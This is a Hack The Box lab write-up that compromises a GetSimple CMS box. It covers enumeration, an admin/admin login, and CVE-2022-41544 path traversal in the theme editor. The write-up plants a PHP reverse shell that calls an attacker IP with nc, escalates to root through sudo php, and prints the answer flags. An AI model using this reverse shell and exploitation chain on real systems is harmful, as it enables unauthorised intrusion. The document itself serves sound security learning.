# HTB Getting Started - Knowledge Check
- **Platform:** Hack The Box
- **Module:** Getting Started
- **Target:** Linux
- **Difficulty:** Starting Point
## Premise
This is the write-up for the Knowledge Check in the **"Getting Started"** module. We are given a target system of `10.129.42.249` and we need to retrieve the `user.txt` flag and the `root.txt` flag.
Let's get started!

## Enumeration
Our first step should be to run a nmap scan to scan for open ports and services.
```bash
$ nmap -sC -sV 10.129.42.249  

Starting Nmap 7.991 ( https://nmap.org ) at 2026-10-29 10:06 +0530
Nmap scan report for 10.129.42.249
Host is up (0.88s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 4c:73:a0:25:f5:fe:81:7b:82:2b:36:49:a5:4d:c8:5e (RSA)
|   256 e1:c0:56:d0:52:04:2f:3c:ac:9a:e7:b1:79:2b:bb:13 (ECDSA)
|_  256 52:31:47:14:0d:c3:8e:15:73:e3:c4:24:a2:3a:12:77 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/admin/
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.31 seconds
```
We notice that there is a `http` site hosted on port **80**. Upon visiting the site via our browser, we find that it's a GetSimple CMS site. This might be interesting. 

A quick Google search for "GetSimple CMS" tells us that GetSimple is a content management system for php sites. If we Google for "GetSimple CMS vulnerabilities", we get a few hits regarding some Remote Code Execution (RCE) vulnerabilities. But let's keep this information for later. We need to dig further and get more details about the version of the CMS that's hosted and other details as well.

Let's continue with our enumeration of the website. We can use **gobuster** here. 
```bash
$ gobuster dir -u http://10.129.42.249 -w /usr/share/seclists/Discovery/Web-Content/common.txt

===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.42.249
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.htaccess            (Status: 403) [Size: 278]
.hta                 (Status: 403) [Size: 278]
.htpasswd            (Status: 403) [Size: 278]
admin                (Status: 301) [Size: 314] [--> http://10.129.42.249/admin/]
backups              (Status: 301) [Size: 316] [--> http://10.129.42.249/backups/]
data                 (Status: 301) [Size: 313] [--> http://10.129.42.249/data/]
index.php            (Status: 200) [Size: 0]
plugins              (Status: 301) [Size: 316] [--> http://10.129.42.249/plugins/]
robots.txt           (Status: 200) [Size: 32]
server-status        (Status: 403) [Size: 278]
sitemap.xml          (Status: 200) [Size: 431]
theme                (Status: 301) [Size: 314] [--> http://10.129.42.249/theme/]
===============================================================
Finished
===============================================================
```
We get a bunch of directory hits. The most interesting one looks like the `http://10.129.42.249/admin/` URL. Upon visiting the page, we see a login page. Hmm, let's try some default simple username password combinations.
```bash
username: admin
password: admin
```
BOOM! Would you look at that? It was a simple `admin/admin` login.
Now that we are in, we can snoop around the admin dashboard. We see a bunch of tabs in the website, but most importantly we get the version of the GetSimple plugin at the bottom of the site -- v3.3.15.

Upon Googling for any known CVEs against this version of the CMS, we see there is a critical vulnerability. **[CVE-2022-41544](https://nvd.nist.gov/vuln/detail/cve-2022-41544)** with a CRITICAL score of 9.8 allows RCE via the `edited_file` parameter in the `admin/theme-edit.php` page by an authenticated user. Now that we have an exploitable vulnerability, we can take advantage of it.

**Note:** We can also check the other URLs that gobuster returned. However, I've skipped them as they were simple directory listings. None of the information was really useful.

## Exploitation
Now that we have enough information from the enumeration step, we can move on to the actual exploit. We noticed a "Theme" tab when we first logged into the admin dashboard. If we navigate to that page, we see an "Edit Theme" button. Upon clicking that, we can see that we can edit the `theme/Innovation/template.php` file. We can try setting up a simple reverse shell with this:
```php
<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.223 9443 >/tmp/f"); ?>
```
However, if we try to save changes directly, we get a "CSRF Detected" error, and the file doesn't get saved. Hmm, that should have worked, but it didn't. Let's go back to the CVE and find a Proof-of-Concept (POC). We can find this [PacketStorm POC](http://packetstormsecurity.com/files/172553/GetSimple-CMS-3.3.16-Shell-Upload.html) in the NVD site. 

If we go through this exploit, we can see that not only are they injecting a php payload, but they're also changing the `edited_file` parameter in the `admin/theme-edit.php` request. Let's load up BurpSuite, send the exact same request again -- but this time, let's change the `edited_file` parameter to `../shell.php` by intercepting the outgoing request. And would you look at that -- we get a "Theme Updated Successfully"  message!

Now this should technically send us back a reverse shell connection request, so let's fire up a netcat listener on our attacking machine:
```bash
nc -lvnp 9443
```
Upon navigating to the path `http://10.129.42.249/shell.php` in our browser, we find that we have established connection!

## Finding the first user.txt flag
First, let's upgrade our shell:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
Now that we have an upgraded shell, we can check who we are logged in as, and what permissions we have with the `id` and the `ls -la` commands:
```bash
www-data@gettingstarted:/var/www/html$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
```bash
www-data@gettingstarted:/var/www/html$ ls -la /home
ls -la /home
total 12
drwxr-xr-x  3 root  root  4096 Mar 12  2024 .
drwxr-xr-x 20 root  root  4096 Mar 12  2024 ..
drwxr-xr-x  3 mrb3n mrb3n 4096 Mar 12  2024 mrb3n

www-data@gettingstarted:/var/www/html$ ls -l /home/mrb3n
ls -la /home/mrb3n
total 40
-rw-rw-r-- 1 mrb3n mrb3n    33 Feb 16  2021 user.txt
```
We see that we are logged in as the `www-data` user. However, we can read `mrb3n`'s files as the contents of the `/home/mrb3n` directory has world-readable read permission.
```bash
www-data@gettingstarted:/var/www/html$ cat /home/mrb3n/user.txt
cat /home/mrb3n/user.txt
7002d65b149b0a4d19132a66feed21d8
```
Voila! We have our first `user.txt` flag!

## Privilege Escalation
We have the `user.txt` flag. The next step is to recover the `root.txt` flag. In order to do that, we need to first see what sudo privileges we have as our current user:
```bash
www-data@gettingstarted:/var/www/html$ sudo -l
sudo -l
Matching Defaults entries for www-data on gettingstarted:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on gettingstarted:
    (ALL : ALL) NOPASSWD: /usr/bin/php
```
Woah. The `www-user` can run `/usr/bin/php` as a superuser (`sudo`) without a password (`NOPASSWD`). That's all we need. We can spawn a bash shell session as root via a php system command.
```bash
www-data@gettingstarted:/var/www/html$ sudo /usr/bin/php -r 'system("/bin/bash");'
sudo /usr/bin/php -r 'system("/bin/bash");'
```
Bingo! We have root access! We can check if we are logged in as root:
```bash
root@gettingstarted:/var/www/html# id    
id
uid=0(root) gid=0(root) groups=0(root)
```
Yup. We are logged in as root. From here on, it's pretty straight-forward. We can check the `/root` directory for a file called `root.txt`:
```bash
root@gettingstarted:/var/www/html# cat /root/root.txt
cat /root/root.txt
f1fba6e9f71efb2630e6e34da6387842
```
And we're done! We have the root flag as well. We can submit both flags, yay!
## Conclusion
This was a pretty fun box for me to solve. Although it was pretty basic, this was my first proper solve with no guides. We started off with enumeration, figured out what vulnerabilities are present in the hosted CMS system, used it to gain access to a shell via RCE. 

We also had a bit of Privilege Escalation with the logged-in user being able to run the PHP binary as root. This shows that we need to be careful with our configurations. 

Overall, this box taught me the importance of changing default credentials (admin/admin), securing file-editing functionality in web-apps, and restricting sudo permissions for interpreters that are capable of executing arbitrary system commands.